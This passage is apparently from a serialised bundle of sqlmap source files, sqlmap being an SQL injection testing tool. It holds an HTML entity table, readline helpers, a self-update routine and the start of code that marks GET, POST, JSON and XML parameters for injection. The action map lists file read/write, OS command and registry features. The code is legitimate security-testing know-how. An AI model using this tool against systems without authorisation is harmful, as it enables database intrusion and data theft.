CONTENT_TYPE.TABLES,\n    \"getColumns\": CONTENT_TYPE.COLUMNS,\n    \"getSchema\": CONTENT_TYPE.SCHEMA,\n    \"getCount\": CONTENT_TYPE.COUNT,\n    \"dumpTable\": CONTENT_TYPE.DUMP_TABLE,\n    \"search\": CONTENT_TYPE.SEARCH,\n    \"sqlQuery\": CONTENT_TYPE.SQL_QUERY,\n    \"tableExists\": CONTENT_TYPE.COMMON_TABLES,\n    \"columnExists\": CONTENT_TYPE.COMMON_COLUMNS,\n    \"readFile\": CONTENT_TYPE.FILE_READ,\n    \"writeFile\": CONTENT_TYPE.FILE_WRITE,\n    \"osCmd\": CONTENT_TYPE.OS_CMD,\n    \"regRead\": CONTENT_TYPE.REG_READ\n}\n\n# Reference: http://www.w3.org/TR/1999/REC-html401-19991224/sgml/entities.html\n\nHTML_ENTITIES = {\n    \"quot\": 34,\n    \"amp\": 38,\n    \"apos\": 39,\n    \"lt\": 60,\n    \"gt\": 62,\n    \"nbsp\": 160,\n    \"iexcl\": 161,\n    \"cent\": 162,\n    \"pound\": 163,\n    \"curren\": 164,\n    \"yen\": 165,\n    \"brvbar\": 166,\n    \"sect\": 167,\n    \"uml\": 168,\n    \"copy\": 169,\n    \"ordf\": 170,\n    \"laquo\": 171,\n    \"not\": 172,\n    \"shy\": 173,\n    \"reg\": 174,\n    \"macr\": 175,\n    \"deg\": 176,\n    \"plusmn\": 177,\n    \"sup2\": 178,\n    \"sup3\": 179,\n    \"acute\": 180,\n    \"micro\": 181,\n    \"para\": 182,\n    \"middot\": 183,\n    \"cedil\": 184,\n    \"sup1\": 185,\n    \"ordm\": 186,\n    \"raquo\": 187,\n    \"frac14\": 188,\n    \"frac12\": 189,\n    \"frac34\": 190,\n    \"iquest\": 191,\n    \"Agrave\": 192,\n    \"Aacute\": 193,\n    \"Acirc\": 194,\n    \"Atilde\": 195,\n    \"Auml\": 196,\n    \"Aring\": 197,\n    \"AElig\": 198,\n    \"Ccedil\": 199,\n    \"Egrave\": 200,\n    \"Eacute\": 201,\n    \"Ecirc\": 202,\n    \"Euml\": 203,\n    \"Igrave\": 204,\n    \"Iacute\": 205,\n    \"Icirc\": 206,\n    \"Iuml\": 207,\n    \"ETH\": 208,\n    \"Ntilde\": 209,\n    \"Ograve\": 210,\n    \"Oacute\": 211,\n    \"Ocirc\": 212,\n    \"Otilde\": 213,\n    \"Ouml\": 214,\n    \"times\": 215,\n    \"Oslash\": 216,\n    \"Ugrave\": 217,\n    \"Uacute\": 218,\n    \"Ucirc\": 219,\n    \"Uuml\": 220,\n    \"Yacute\": 221,\n    \"THORN\": 222,\n    \"szlig\": 223,\n    \"agrave\": 224,\n    \"aacute\": 225,\n    \"acirc\": 226,\n    \"atilde\": 227,\n    \"auml\": 228,\n    \"aring\": 229,\n    \"aelig\": 230,\n    \"ccedil\": 231,\n    \"egrave\": 232,\n    \"eacute\": 233,\n    \"ecirc\": 234,\n    \"euml\": 235,\n    \"igrave\": 236,\n    \"iacute\": 237,\n    \"icirc\": 238,\n    \"iuml\": 239,\n    \"eth\": 240,\n    \"ntilde\": 241,\n    \"ograve\": 242,\n    \"oacute\": 243,\n    \"ocirc\": 244,\n    \"otilde\": 245,\n    \"ouml\": 246,\n    \"divide\": 247,\n    \"oslash\": 248,\n    \"ugrave\": 249,\n    \"uacute\": 250,\n    \"ucirc\": 251,\n    \"uuml\": 252,\n    \"yacute\": 253,\n    \"thorn\": 254,\n    \"yuml\": 255,\n    \"OElig\": 338,\n    \"oelig\": 339,\n    \"Scaron\": 352,\n    \"fnof\": 402,\n    \"scaron\": 353,\n    \"Yuml\": 376,\n    \"circ\": 710,\n    \"tilde\": 732,\n    \"Alpha\": 913,\n    \"Beta\": 914,\n    \"Gamma\": 915,\n    \"Delta\": 916,\n    \"Epsilon\": 917,\n    \"Zeta\": 918,\n    \"Eta\": 919,\n    \"Theta\": 920,\n    \"Iota\": 921,\n    \"Kappa\": 922,\n    \"Lambda\": 923,\n    \"Mu\": 924,\n    \"Nu\": 925,\n    \"Xi\": 926,\n    \"Omicron\": 927,\n    \"Pi\": 928,\n    \"Rho\": 929,\n    \"Sigma\": 931,\n    \"Tau\": 932,\n    \"Upsilon\": 933,\n    \"Phi\": 934,\n    \"Chi\": 935,\n    \"Psi\": 936,\n    \"Omega\": 937,\n    \"alpha\": 945,\n    \"beta\": 946,\n    \"gamma\": 947,\n    \"delta\": 948,\n    \"epsilon\": 949,\n    \"zeta\": 950,\n    \"eta\": 951,\n    \"theta\": 952,\n    \"iota\": 953,\n    \"kappa\": 954,\n    \"lambda\": 955,\n    \"mu\": 956,\n    \"nu\": 957,\n    \"xi\": 958,\n    \"omicron\": 959,\n    \"pi\": 960,\n    \"rho\": 961,\n    \"sigmaf\": 962,\n    \"sigma\": 963,\n    \"tau\": 964,\n    \"upsilon\": 965,\n    \"phi\": 966,\n    \"chi\": 967,\n    \"psi\": 968,\n    \"omega\": 969,\n    \"thetasym\": 977,\n    \"upsih\": 978,\n    \"piv\": 982,\n    \"bull\": 8226,\n    \"hellip\": 8230,\n    \"prime\": 8242,\n    \"Prime\": 8243,\n    \"oline\": 8254,\n    \"frasl\": 8260,\n    \"ensp\": 8194,\n    \"emsp\": 8195,\n    \"thinsp\": 8201,\n    \"zwnj\": 8204,\n    \"zwj\": 8205,\n    \"lrm\": 8206,\n    \"rlm\": 8207,\n    \"ndash\": 8211,\n    \"mdash\": 8212,\n    \"lsquo\": 8216,\n    \"rsquo\": 8217,\n    \"sbquo\": 8218,\n    \"ldquo\": 8220,\n    \"rdquo\": 8221,\n    \"bdquo\": 8222,\n    \"dagger\": 8224,\n    \"Dagger\": 8225,\n    \"permil\": 8240,\n    \"lsaquo\": 8249,\n    \"rsaquo\": 8250,\n    \"euro\": 8364,\n    \"weierp\": 8472,\n    \"image\": 8465,\n    \"real\": 8476,\n    \"trade\": 8482,\n    \"alefsym\": 8501,\n    \"larr\": 8592,\n    \"uarr\": 8593,\n    \"rarr\": 8594,\n    \"darr\": 8595,\n    \"harr\": 8596,\n    \"crarr\": 8629,\n    \"lArr\": 8656,\n    \"uArr\": 8657,\n    \"rArr\": 8658,\n    \"dArr\": 8659,\n    \"hArr\": 8660,\n    \"forall\": 8704,\n    \"part\": 8706,\n    \"exist\": 8707,\n    \"empty\": 8709,\n    \"nabla\": 8711,\n    \"isin\": 8712,\n    \"notin\": 8713,\n    \"ni\": 8715,\n    \"prod\": 8719,\n    \"sum\": 8721,\n    \"minus\": 8722,\n    \"lowast\": 8727,\n    \"radic\": 8730,\n    \"prop\": 8733,\n    \"infin\": 8734,\n    \"ang\": 8736,\n    \"and\": 8743,\n    \"or\": 8744,\n    \"cap\": 8745,\n    \"cup\": 8746,\n    \"int\": 8747,\n    \"there4\": 8756,\n    \"sim\": 8764,\n    \"cong\": 8773,\n    \"asymp\": 8776,\n    \"ne\": 8800,\n    \"equiv\": 8801,\n    \"le\": 8804,\n    \"ge\": 8805,\n    \"sub\": 8834,\n    \"sup\": 8835,\n    \"nsub\": 8836,\n    \"sube\": 8838,\n    \"supe\": 8839,\n    \"oplus\": 8853,\n    \"otimes\": 8855,\n    \"perp\": 8869,\n    \"sdot\": 8901,\n    \"lceil\": 8968,\n    \"rceil\": 8969,\n    \"lfloor\": 8970,\n    \"rfloor\": 8971,\n    \"lang\": 9001,\n    \"rang\": 9002,\n    \"loz\": 9674,\n    \"spades\": 9824,\n    \"clubs\": 9827,\n    \"hearts\": 9829,\n    \"diams\": 9830\n}\n", "lib/core/readlineng.py": "#!/usr/bin/env python\n\n\"\"\"\nCopyright (c) 2006-2024 sqlmap developers (https://sqlmap.org/)\nSee the file 'LICENSE' for copying permission\n\"\"\"\n\n_readline = None\ntry:\n    from readline import *\n    import readline as _readline\nexcept:\n    try:\n        from pyreadline import *\n        import pyreadline as _readline\n    except:\n        pass\n\nfrom lib.core.data import logger\nfrom lib.core.settings import IS_WIN\nfrom lib.core.settings import PLATFORM\n\nif IS_WIN and _readline:\n    try:\n        _outputfile = _readline.GetOutputFile()\n    except AttributeError:\n        debugMsg = \"Failed GetOutputFile when using platform's \"\n        debugMsg += \"readline library\"\n        logger.debug(debugMsg)\n\n        _readline = None\n\n# Test to see if libedit is being used instead of GNU readline.\n# Thanks to Boyd Waters for this patch.\nuses_libedit = False\n\nif PLATFORM == \"mac\" and _readline:\n    import commands\n\n    (status, result) = commands.getstatusoutput(\"otool -L %s | grep libedit\" % _readline.__file__)\n\n    if status == 0 and len(result) > 0:\n        # We are bound to libedit - new in Leopard\n        _readline.parse_and_bind(\"bind ^I rl_complete\")\n\n        debugMsg = \"Leopard libedit detected when using platform's \"\n        debugMsg += \"readline library\"\n        logger.debug(debugMsg)\n\n        uses_libedit = True\n\n# the clear_history() function was only introduced in Python 2.4 and is\n# actually optional in the readline API, so we must explicitly check for its\n# existence.  Some known platforms actually don't have it.  This thread:\n# http://mail.python.org/pipermail/python-dev/2003-August/037845.html\n# has the original discussion.\nif _readline:\n    if not hasattr(_readline, \"clear_history\"):\n        def clear_history():\n            pass\n\n        _readline.clear_history = clear_history\n", "lib/core/unescaper.py": "#!/usr/bin/env python\n\n\"\"\"\nCopyright (c) 2006-2024 sqlmap developers (https://sqlmap.org/)\nSee the file 'LICENSE' for copying permission\n\"\"\"\n\nfrom lib.core.common import Backend\nfrom lib.core.datatype import AttribDict\nfrom lib.core.settings import EXCLUDE_UNESCAPE\n\nclass Unescaper(AttribDict):\n    def escape(self, expression, quote=True, dbms=None):\n        if expression is None:\n            return expression\n\n        for exclude in EXCLUDE_UNESCAPE:\n            if exclude in expression:\n                return expression\n\n        identifiedDbms = Backend.getIdentifiedDbms()\n\n        if dbms is not None:\n            retVal = self[dbms](expression, quote=quote)\n        elif identifiedDbms is not None and identifiedDbms in self:\n            retVal = self[identifiedDbms](expression, quote=quote)\n        else:\n            retVal = expression\n\n        # e.g. inference comparison for '\n        retVal = retVal.replace(\"'''\", \"''''\")\n\n        return retVal\n\nunescaper = Unescaper()\n", "lib/core/update.py": "#!/usr/bin/env python\n\n\"\"\"\nCopyright (c) 2006-2024 sqlmap developers (https://sqlmap.org/)\nSee the file 'LICENSE' for copying permission\n\"\"\"\n\nimport glob\nimport os\nimport re\nimport shutil\nimport subprocess\nimport time\nimport zipfile\n\nfrom lib.core.common import dataToStdout\nfrom lib.core.common import extractRegexResult\nfrom lib.core.common import getLatestRevision\nfrom lib.core.common import getSafeExString\nfrom lib.core.common import openFile\nfrom lib.core.common import pollProcess\nfrom lib.core.common import readInput\nfrom lib.core.convert import getText\nfrom lib.core.data import conf\nfrom lib.core.data import logger\nfrom lib.core.data import paths\nfrom lib.core.revision import getRevisionNumber\nfrom lib.core.settings import GIT_REPOSITORY\nfrom lib.core.settings import IS_WIN\nfrom lib.core.settings import VERSION\nfrom lib.core.settings import TYPE\nfrom lib.core.settings import ZIPBALL_PAGE\nfrom thirdparty.six.moves import urllib as _urllib\n\ndef update():\n    if not conf.updateAll:\n        return\n\n    success = False\n\n    if TYPE == \"pip\":\n        infoMsg = \"updating sqlmap to the latest stable version from the \"\n        infoMsg += \"PyPI repository\"\n        logger.info(infoMsg)\n\n        debugMsg = \"sqlmap will try to update itself using 'pip' command\"\n        logger.debug(debugMsg)\n\n        dataToStdout(\"\\r[%s] [INFO] update in progress\" % time.strftime(\"%X\"))\n\n        output = \"\"\n        try:\n            process = subprocess.Popen(\"pip install -U sqlmap\", shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, cwd=paths.SQLMAP_ROOT_PATH)\n            pollProcess(process, True)\n            output, _ = process.communicate()\n            success = not process.returncode\n        except Exception as ex:\n            success = False\n            output = getSafeExString(ex)\n        finally:\n            output = getText(output)\n\n        if success:\n            logger.info(\"%s the latest revision '%s'\" % (\"already at\" if \"already up-to-date\" in output else \"updated to\", extractRegexResult(r\"\\binstalled sqlmap-(?P<result>\\d+\\.\\d+\\.\\d+)\", output) or extractRegexResult(r\"\\((?P<result>\\d+\\.\\d+\\.\\d+)\\)\", output)))\n        else:\n            logger.error(\"update could not be completed ('%s')\" % re.sub(r\"[^a-z0-9:/\\\\]+\", \" \", output).strip())\n\n    elif not os.path.exists(os.path.join(paths.SQLMAP_ROOT_PATH, \".git\")):\n        warnMsg = \"not a git repository. It is recommended to clone the 'sqlmapproject/sqlmap' repository \"\n        warnMsg += \"from GitHub (e.g. 'git clone --depth 1 %s sqlmap')\" % GIT_REPOSITORY\n        logger.warning(warnMsg)\n\n        if VERSION == getLatestRevision():\n            logger.info(\"already at the latest revision '%s'\" % (getRevisionNumber() or VERSION))\n            return\n\n        message = \"do you want to try to fetch the latest 'zipball' from repository and extract it (experimental) ? [y/N]\"\n        if readInput(message, default='N', boolean=True):\n            directory = os.path.abspath(paths.SQLMAP_ROOT_PATH)\n\n            try:\n                open(os.path.join(directory, \"sqlmap.py\"), \"w+b\")\n            except Exception as ex:\n                errMsg = \"unable to update content of directory '%s' ('%s')\" % (directory, getSafeExString(ex))\n                logger.error(errMsg)\n            else:\n                attrs = os.stat(os.path.join(directory, \"sqlmap.py\")).st_mode\n                for wildcard in ('*', \".*\"):\n                    for _ in glob.glob(os.path.join(directory, wildcard)):\n                        try:\n                            if os.path.isdir(_):\n                                shutil.rmtree(_)\n                            else:\n                                os.remove(_)\n                        except:\n                            pass\n\n                if glob.glob(os.path.join(directory, '*')):\n                    errMsg = \"unable to clear the content of directory '%s'\" % directory\n                    logger.error(errMsg)\n                else:\n                    try:\n                        archive = _urllib.request.urlretrieve(ZIPBALL_PAGE)[0]\n\n                        with zipfile.ZipFile(archive) as f:\n                            for info in f.infolist():\n                                info.filename = re.sub(r\"\\Asqlmap[^/]+\", \"\", info.filename)\n                                if info.filename:\n                                    f.extract(info, directory)\n\n                        filepath = os.path.join(paths.SQLMAP_ROOT_PATH, \"lib\", \"core\", \"settings.py\")\n                        if os.path.isfile(filepath):\n                            with openFile(filepath, \"rb\") as f:\n                                version = re.search(r\"(?m)^VERSION\\s*=\\s*['\\\"]([^'\\\"]+)\", f.read()).group(1)\n                                logger.info(\"updated to the latest version '%s#dev'\" % version)\n                                success = True\n                    except Exception as ex:\n                        logger.error(\"update could not be completed ('%s')\" % getSafeExString(ex))\n                    else:\n                        if not success:\n                            logger.error(\"update could not be completed\")\n                        else:\n                            try:\n                                os.chmod(os.path.join(directory, \"sqlmap.py\"), attrs)\n                            except OSError:\n                                logger.warning(\"could not set the file attributes of '%s'\" % os.path.join(directory, \"sqlmap.py\"))\n\n    else:\n        infoMsg = \"updating sqlmap to the latest development revision from the \"\n        infoMsg += \"GitHub repository\"\n        logger.info(infoMsg)\n\n        debugMsg = \"sqlmap will try to update itself using 'git' command\"\n        logger.debug(debugMsg)\n\n        dataToStdout(\"\\r[%s] [INFO] update in progress\" % time.strftime(\"%X\"))\n\n        output = \"\"\n        try:\n            process = subprocess.Popen(\"git checkout . && git pull %s HEAD\" % GIT_REPOSITORY, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, cwd=paths.SQLMAP_ROOT_PATH)\n            pollProcess(process, True)\n            output, _ = process.communicate()\n            success = not process.returncode\n        except Exception as ex:\n            success = False\n            output = getSafeExString(ex)\n        finally:\n            output = getText(output)\n\n        if success:\n            logger.info(\"%s the latest revision '%s'\" % (\"already at\" if \"Already\" in output else \"updated to\", getRevisionNumber()))\n        else:\n            if \"Not a git repository\" in output:\n                errMsg = \"not a valid git repository. Please checkout the 'sqlmapproject/sqlmap' repository \"\n                errMsg += \"from GitHub (e.g. 'git clone --depth 1 %s sqlmap')\" % GIT_REPOSITORY\n                logger.error(errMsg)\n            else:\n                logger.error(\"update could not be completed ('%s')\" % re.sub(r\"\\W+\", \" \", output).strip())\n\n    if not success:\n        if IS_WIN:\n            infoMsg = \"for Windows platform it's recommended \"\n            infoMsg += \"to use a GitHub for Windows client for updating \"\n            infoMsg += \"purposes (https://desktop.github.com/) or just \"\n            infoMsg += \"download the latest snapshot from \"\n            infoMsg += \"https://github.com/sqlmapproject/sqlmap/downloads\"\n        else:\n            infoMsg = \"for Linux platform it's recommended \"\n            infoMsg += \"to install a standard 'git' package (e.g.: 'apt install git')\"\n\n        logger.info(infoMsg)\n", "lib/core/target.py": "#!/usr/bin/env python\n\n\"\"\"\nCopyright (c) 2006-2024 sqlmap developers (https://sqlmap.org/)\nSee the file 'LICENSE' for copying permission\n\"\"\"\n\nimport functools\nimport os\nimport re\nimport subprocess\nimport sys\nimport tempfile\nimport time\n\nfrom lib.core.common import Backend\nfrom lib.core.common import getSafeExString\nfrom lib.core.common import hashDBRetrieve\nfrom lib.core.common import intersect\nfrom lib.core.common import isNumPosStrValue\nfrom lib.core.common import normalizeUnicode\nfrom lib.core.common import openFile\nfrom lib.core.common import paramToDict\nfrom lib.core.common import randomStr\nfrom lib.core.common import readInput\nfrom lib.core.common import removePostHintPrefix\nfrom lib.core.common import resetCookieJar\nfrom lib.core.common import safeStringFormat\nfrom lib.core.common import unArrayizeValue\nfrom lib.core.common import urldecode\nfrom lib.core.compat import xrange\nfrom lib.core.convert import decodeBase64\nfrom lib.core.convert import getUnicode\nfrom lib.core.data import conf\nfrom lib.core.data import kb\nfrom lib.core.data import logger\nfrom lib.core.data import mergedOptions\nfrom lib.core.data import paths\nfrom lib.core.datatype import InjectionDict\nfrom lib.core.dicts import DBMS_DICT\nfrom lib.core.dump import dumper\nfrom lib.core.enums import HASHDB_KEYS\nfrom lib.core.enums import HTTP_HEADER\nfrom lib.core.enums import HTTPMETHOD\nfrom lib.core.enums import MKSTEMP_PREFIX\nfrom lib.core.enums import PLACE\nfrom lib.core.enums import POST_HINT\nfrom lib.core.exception import SqlmapFilePathException\nfrom lib.core.exception import SqlmapGenericException\nfrom lib.core.exception import SqlmapMissingPrivileges\nfrom lib.core.exception import SqlmapNoneDataException\nfrom lib.core.exception import SqlmapSystemException\nfrom lib.core.exception import SqlmapUserQuitException\nfrom lib.core.option import _setAuthCred\nfrom lib.core.option import _setDBMS\nfrom lib.core.option import _setKnowledgeBaseAttributes\nfrom lib.core.settings import ARRAY_LIKE_RECOGNITION_REGEX\nfrom lib.core.settings import ASTERISK_MARKER\nfrom lib.core.settings import CSRF_TOKEN_PARAMETER_INFIXES\nfrom lib.core.settings import CUSTOM_INJECTION_MARK_CHAR\nfrom lib.core.settings import DEFAULT_GET_POST_DELIMITER\nfrom lib.core.settings import HOST_ALIASES\nfrom lib.core.settings import INJECT_HERE_REGEX\nfrom lib.core.settings import JSON_LIKE_RECOGNITION_REGEX\nfrom lib.core.settings import JSON_RECOGNITION_REGEX\nfrom lib.core.settings import MULTIPART_RECOGNITION_REGEX\nfrom lib.core.settings import PROBLEMATIC_CUSTOM_INJECTION_PATTERNS\nfrom lib.core.settings import REFERER_ALIASES\nfrom lib.core.settings import RESTORE_MERGED_OPTIONS\nfrom lib.core.settings import RESULTS_FILE_FORMAT\nfrom lib.core.settings import SESSION_SQLITE_FILE\nfrom lib.core.settings import SUPPORTED_DBMS\nfrom lib.core.settings import UNENCODED_ORIGINAL_VALUE\nfrom lib.core.settings import UNICODE_ENCODING\nfrom lib.core.settings import UNKNOWN_DBMS_VERSION\nfrom lib.core.settings import URI_INJECTABLE_REGEX\nfrom lib.core.settings import USER_AGENT_ALIASES\nfrom lib.core.settings import XML_RECOGNITION_REGEX\nfrom lib.core.threads import getCurrentThreadData\nfrom lib.utils.hashdb import HashDB\nfrom thirdparty import six\nfrom thirdparty.odict import OrderedDict\nfrom thirdparty.six.moves import urllib as _urllib\n\ndef _setRequestParams():\n    \"\"\"\n    Check and set the parameters and perform checks on 'data' option for\n    HTTP method POST.\n    \"\"\"\n\n    if conf.direct:\n        conf.parameters[None] = \"direct connection\"\n        return\n\n    hintNames = []\n    testableParameters = False\n\n    # Perform checks on GET parameters\n    if conf.parameters.get(PLACE.GET):\n        parameters = conf.parameters[PLACE.GET]\n        paramDict = paramToDict(PLACE.GET, parameters)\n\n        if paramDict:\n            conf.paramDict[PLACE.GET] = paramDict\n            testableParameters = True\n\n    # Perform checks on POST parameters\n    if conf.method == HTTPMETHOD.POST and conf.data is None:\n        logger.warning(\"detected empty POST body\")\n        conf.data = \"\"\n\n    if conf.data is not None:\n        conf.method = conf.method or HTTPMETHOD.POST\n\n        def process(match, repl):\n            retVal = match.group(0)\n\n            if not (conf.testParameter and match.group(\"name\") not in (removePostHintPrefix(_) for _ in conf.testParameter)) and match.group(\"name\") == match.group(\"name\").strip('\\\\'):\n                retVal = repl\n                while True:\n                    _ = re.search(r\"\\\\g<([^>]+)>\", retVal)\n                    if _:\n                        try:\n                            retVal = retVal.replace(_.group(0), match.group(int(_.group(1)) if _.group(1).isdigit() else _.group(1)))\n                        except IndexError:\n                            break\n                    else:\n                        break\n                if kb.customInjectionMark in retVal:\n                    hintNames.append((retVal.split(kb.customInjectionMark)[0], match.group(\"name\").strip('\"\\'') if kb.postHint == POST_HINT.JSON_LIKE else match.group(\"name\")))\n\n            return retVal\n\n        if kb.processUserMarks is None and kb.customInjectionMark in conf.data:\n            message = \"custom injection marker ('%s') found in %s \" % (kb.customInjectionMark, conf.method)\n            message += \"body. Do you want to process it? [Y/n/q] \"\n            choice = readInput(message, default='Y').upper()\n\n            if choice == 'Q':\n                raise SqlmapUserQuitException\n            else:\n                kb.processUserMarks = choice == 'Y'\n\n                if kb.processUserMarks:\n                    kb.testOnlyCustom = True\n\n        if re.search(JSON_RECOGNITION_REGEX, conf.data):\n            message = \"JSON data found in %s body. \" % conf.method\n            message += \"Do you want to process it? [Y/n/q] \"\n            choice = readInput(message, default='Y').upper()\n\n            if choice == 'Q':\n                raise SqlmapUserQuitException\n            elif choice == 'Y':\n                kb.postHint = POST_HINT.JSON\n                if not (kb.processUserMarks and kb.customInjectionMark in conf.data):\n                    conf.data = getattr(conf.data, UNENCODED_ORIGINAL_VALUE, conf.data)\n                    conf.data = conf.data.replace(kb.customInjectionMark, ASTERISK_MARKER)\n                    conf.data = re.sub(r'(\"(?P<name>[^\"]+)\"\\s*:\\s*\".*?)\"(?<!\\\\\")', functools.partial(process, repl=r'\\g<1>%s\"' % kb.customInjectionMark), conf.data)\n                    conf.data = re.sub(r'(\"(?P<name>[^\"]+)\"\\s*:\\s*\")\"', functools.partial(process, repl=r'\\g<1>%s\"' % kb.customInjectionMark), conf.data)\n                    conf.data = re.sub(r'(\"(?P<name>[^\"]+)\"\\s*:\\s*)(-?\\d[\\d\\.]*)\\b', functools.partial(process, repl=r'\\g<1>\\g<3>%s' % kb.customInjectionMark), conf.data)\n                    conf.data = re.sub(r'(\"(?P<name>[^\"]+)\"\\s*:\\s*)((true|false|null))\\b', functools.partial(process, repl=r'\\g<1>\\g<3>%s' % kb.customInjectionMark), conf.data)\n                    for match in re.finditer(r'(?P<name>[^\"]+)\"\\s*:\\s*\\[([^\\]]+)\\]', conf.data):\n                        if not (conf.testParameter and match.group(\"name\") not in conf.testParameter):\n                            _ = match.group(2)\n                            if kb.customInjectionMark not in _:  # Note: only for unprocessed (simple) forms - i.e. non-associative arrays (e.g. [1,2,3])\n                                _ = re.sub(r'(\"[^\"]+)\"', r'\\g<1>%s\"' % kb.customInjectionMark, _)\n                                _ = re.sub(r'(\\A|,|\\s+)(-?\\d[\\d\\.]*\\b)', r'\\g<0>%s' % kb.customInjectionMark, _)\n                                conf.data = conf.data.replace(match.group(0), match.group(0).replace(match.group(2), _))\n\n        elif re.search(JSON_LIKE_RECOGNITION_REGEX, conf.data):\n            message = \"JSON-like data found in %s body. \" % conf.method\n            message += \"Do you want to process it? [Y/n/q] \"\n            choice = readInput(message, default='Y').upper()\n\n            if choice == 'Q':\n                raise SqlmapUserQuitException\n            elif choice == 'Y':\n                kb.postHint = POST_HINT.JSON_LIKE\n                if not (kb.processUserMarks and kb.customInjectionMark in conf.data):\n                    conf.data = getattr(conf.data, UNENCODED_ORIGINAL_VALUE, conf.data)\n                    conf.data = conf.data.replace(kb.customInjectionMark, ASTERISK_MARKER)\n                    if '\"' in conf.data:\n                        conf.data = re.sub(r'((?P<name>\"[^\"]+\"|\\w+)\\s*:\\s*\"[^\"]+)\"', functools.partial(process, repl=r'\\g<1>%s\"' % kb.customInjectionMark), conf.data)\n                        conf.data = re.sub(r'((?P<name>\"[^\"]+\"|\\w+)\\s*:\\s*)(-?\\d[\\d\\.]*\\b)', functools.partial(process, repl=r'\\g<0>%s' % kb.customInjectionMark), conf.data)\n                    else:\n                        conf.data = re.sub(r\"((?P<name>'[^']+'|\\w+)\\s*:\\s*'[^']+)'\", functools.partial(process, repl=r\"\\g<1>%s'\" % kb.customInjectionMark), conf.data)\n                        conf.data = re.sub(r\"((?P<name>'[^']+'|\\w+)\\s*:\\s*)(-?\\d[\\d\\.]*\\b)\", functools.partial(process, repl=r\"\\g<0>%s\" % kb.customInjectionMark), conf.data)\n\n        elif re.search(ARRAY_LIKE_RECOGNITION_REGEX, conf.data):\n            message = \"Array-like data found in %s body. \" % conf.method\n            message += \"Do you want to process it? [Y/n/q] \"\n            choice = readInput(message, default='Y').upper()\n\n            if choice == 'Q':\n                raise SqlmapUserQuitException\n            elif choice == 'Y':\n                kb.postHint = POST_HINT.ARRAY_LIKE\n                if not (kb.processUserMarks and kb.customInjectionMark in conf.data):\n                    conf.data = conf.data.replace(kb.customInjectionMark, ASTERISK_MARKER)\n                    conf.data = re.sub(r\"(=[^%s]+)\" % DEFAULT_GET_POST_DELIMITER, r\"\\g<1>%s\" % kb.customInjectionMark, conf.data)\n\n        elif re.search(XML_RECOGNITION_REGEX, conf.data):\n            message = \"SOAP/XML data found in %s body. \" % conf.method\n            message += \"Do you want to process it? [Y/n/q] \"\n            choice = readInput(message, default='Y').upper()\n\n            if choice == 'Q':\n                raise SqlmapUserQuitException\n            elif choice == 'Y':\n                kb.postHint = POST_HINT.SOAP if \"soap\" in conf.data.lower() else POST_HINT.XML\n                if not (kb.processUserMarks and kb.customInjectionMark in conf.data):\n                    conf.data = getattr(conf.data, UNENCODED_ORIGINAL_VALUE, conf.data)\n                    conf.data = conf.data.replace(kb.customInjectionMark, ASTERISK_MARKER)\n                    conf.data = re.sub(r\"(<(?P<name>[^>]+)( [^<]*)?>)([^<]+)(</\\2)\", functools.partial(process, repl=r\"\\g<1>\\g<4>%s\\g<5>\" % kb.customInjectionMark), conf.data)\n\n        elif re.search(MULTIPART_RECOGNITION_REGEX, conf.data):\n            message = \"Multipart-like data found in %s body. \" % conf.method\n            message += \"Do you want to process it? [Y/n/q] \"\n            choice = readInput(message, default='Y').upper()\n\n            if choice == 'Q':\n                raise SqlmapUserQuitException\n            elif choice == 'Y':\n                kb.postHint = POST_HINT.MULTIPART\n                if not (kb.processUserMarks and kb.customInjectionMark in conf.data):\n                    conf.data = getattr(conf.data, UNENCODED_ORIGINAL_VALUE, conf.data)\n                    conf.data = conf.data.replace(kb.customInjectionMark, ASTERISK_MARKER)\n                    conf.data = re.sub(r\"(?si)(Content-Disposition:[^\\n]+\\s+name=\\\"(?P<name>[^\\\"]+)\\\"(?:[^f|^b]|f(?!ilename=)|b(?!oundary=))*?)((%s)--)\" % (\"\\r\\n\" if \"\\r\\n\" in conf.data else '\\n'),\n                                        functools.partial(process, repl=r\"\\g<1>%s\\g<3>\" % kb.customInjectionMark), conf.data)\n\n        if not kb.postHint:\n            if kb.customInjectionMark in conf.data:  # later processed\n                pass\n            else:\n                place = PLACE.POST\n\n                conf.parameters[place] = conf.data\n                paramDict = paramToDict(place, conf.data)\n\n                if paramDict:\n                    conf.paramDict[place] = paramDict\n                    testableParameters = True\n        else:\n            if kb.customInjectionMark not in conf.data:  # in case that no usable parameter values has been found\n                conf.parameters[PLACE.POST] = conf.data\n\n    kb.processUserMarks = True if (kb.postHint and kb.customInjectionMark in (conf.data or \"\")) else kb.processUserMarks\n\n    if re.search(URI_INJECTABLE_REGEX, conf.url, re.I) and not any(place in conf.parameters for place in (PLACE.GET, PLACE.POST)) and not kb.postHint and kb.customInjectionMark not in (conf.data or \"\") and conf.url.startswith(\"http\"):\n        warnMsg = \"you've provided target URL without any GET \"\n        warnMsg += \"parameters (e.g. 'http://www.site.com/article.php?id=1') \"\n        warnMsg += \"and without providing any POST parameters \"\n        warnMsg += \"through option '--data'\"\n        logger.warning(warnMsg)\n\n        message = \"do you want to try URI injections \"\n        message += \"in the target URL itself? [Y/n/q] \"\n        choice = readInput(message, default='Y').upper()\n\n        if choice == 'Q':\n            raise SqlmapUserQuitException\n        elif choice == 'Y':\n            conf.url = \"%s%s\" % (conf.url, kb.customInjectionMark)\n            kb.processUserMarks = True\n\n    for place, value in ((PLACE.URI, conf.url), (PLACE.CUSTOM_POST, conf.data), (PLACE.CUSTOM_HEADER, str(conf.httpHeaders))):\n        if place == PLACE.CUSTOM_HEADER and any((conf.forms, conf.crawlDepth)):\n            continue\n\n        _ = re.sub(PROBLEMATIC_CUSTOM_INJECTION_PATTERNS, \"\", value or \"\") if place == PLACE.CUSTOM_HEADER else value or \"\"\n        if kb.customInjectionMark in _:\n            if kb.processUserMarks is None:\n                lut = {PLACE.URI: '-u', PLACE.CUSTOM_POST: '--data', PLACE.CUSTOM_HEADER: '--headers/--user-agent/--referer/--cookie'}\n                message = \"custom injection marker ('%s') found in option \" % kb.customInjectionMark\n                message += \"'%s'. Do you want to process it? [Y/n/q] \" % lut[place]\n                choice = readInput(message, default='Y').upper()\n\n                if choice == 'Q':\n                    raise SqlmapUserQuitException\n                else:\n                    kb.processUserMarks = choice == 'Y'\n\n                    if kb.processUserMarks:\n                        kb.testOnlyCustom = True\n\n                        if \"=%s\" % kb.customInjectionMark in _:\n                            warnMsg = \"it seems that you've provided empty parameter value(s) \"\n                            warnMsg += \"for testing. Please, always use only valid parameter values 